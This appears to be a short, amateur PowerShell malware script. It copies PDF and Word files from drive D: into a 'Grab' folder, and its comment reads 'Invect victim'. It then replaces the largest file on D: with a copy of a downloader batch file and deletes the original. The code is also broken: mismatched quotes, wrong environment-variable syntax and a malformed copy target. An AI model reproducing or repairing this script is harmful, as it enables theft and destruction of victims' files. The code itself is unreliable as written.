$output = "%User%\Desktop\Grab"
$input = "D:\*.pdf,*.docx"
$inputv = "%User%\Desktop\V\Downloader.bat"
$outputv = "D:\test.ps1"
Copy-Item -path $input -destination $output
#Invect victim
$sise = "(gci -path "D:\" -r | sort Length -desc | select fullname -f 1)"
$size = "D:\$sise"
Copy-Item -path $inputv -destination $size.ps1
Remove-Item -path $size